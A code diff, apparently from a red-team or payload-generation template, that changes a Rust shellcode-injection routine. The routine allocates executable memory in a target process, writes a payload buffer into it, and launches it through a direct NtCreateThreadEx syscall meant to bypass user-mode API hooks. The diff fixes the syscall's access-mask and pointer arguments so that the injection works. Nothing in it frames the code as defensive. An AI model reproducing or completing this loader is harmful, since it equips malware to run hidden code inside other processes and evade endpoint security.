@@ -9,7 +9,7 @@ use ntapi::{
 };
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MAXIMUM_ALLOWED},
+        winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, GENERIC_ALL},
         lmaccess::{ACCESS_ALL}
     },
     shared::{
@@ -18,6 +18,7 @@ use winapi::{
 };
 use ntapi::winapi::ctypes::c_void;
 use ntapi::ntpsapi::PS_ATTRIBUTE_LIST;
+use winapi::shared::ntdef::NULL;
 //use ntapi::ntpsapi::NtCreateThreadEx;
 
 {{IMPORTS}}
@@ -58,7 +59,7 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
             PAGE_EXECUTE_READWRITE
         );
         if !NT_SUCCESS(alloc_status) {
-            panic!("Error allocating  memory to the target process: {}", alloc_status);
+            panic!("Error allocating memory to the target process: {}", alloc_status);
         }
         let mut bytes_written = 0;
         let buffer = buf.as_mut_ptr() as *mut c_void;
@@ -78,17 +79,17 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
 
         let mut thread_handle : *mut c_void = null_mut();
         let handle = process_handle as *mut c_void;
-        let lol1: *mut OBJECT_ATTRIBUTES = null_mut();
-        let lol2: *mut c_void = null_mut();
-        let lol3: *mut PS_ATTRIBUTE_LIST = null_mut();
+        let mut lol1: *mut OBJECT_ATTRIBUTES = null_mut();
+        let mut lol2: *mut c_void = null_mut();
+        let mut lol3: *mut PS_ATTRIBUTE_LIST = null_mut();
         
-        let write_thread = syscall!(
+        /*let write_thread = syscall!(
             "NtCreateThreadEx",
             &mut thread_handle,
             MAXIMUM_ALLOWED, 
             lol1,
             handle,
-            mem::transmute(allocstart), 
+            allocstart, 
             lol2,
             0, 
             0, 
@@ -96,7 +97,22 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
             0, 
             lol3
         );
-        
+        */
+        let write_thread = syscall!(
+            "NtCreateThreadEx",
+            &mut thread_handle,
+            GENERIC_ALL, 
+            &mut lol1,
+            handle,
+            allocstart, 
+            NULL,
+            0, 
+            0, 
+            0, 
+            0, 
+            &mut lol3
+        );
+
         //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
         //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, lol1, handle, allocstart, lol2, 0, 0, 0, 0, lol3);
 
